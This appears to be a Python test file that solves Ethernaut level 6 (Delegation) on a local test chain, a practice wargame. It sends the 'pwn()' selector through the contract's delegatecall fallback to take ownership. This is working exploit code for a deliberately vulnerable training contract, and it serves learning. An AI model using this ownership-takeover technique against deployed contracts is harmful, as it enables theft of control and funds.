from wake.testing import *
from tests.ethernaut_deployer import EthernautDeployer
from pytypes.contracts.lv06_delegation import Delegate, Delegation


@default_chain.connect()
def test_lv06():
    ethernaut = EthernautDeployer(default_chain)
    contract = ethernaut.deploy_lv06()
    exploit_lv06(contract)
    ethernaut.check_lv06(contract)

def generate_payload() -> bytes:
    binary_data = Abi.encode_with_signature("pwn()", [], [])
    return binary_data

def exploit_lv06(contract: Delegation):
    # Attack vector: insecure function in implementation contract
    # Training: delegatecall, fallback(), invoking function by function selector 
    payload = generate_payload()
    contract.transact(data=payload)
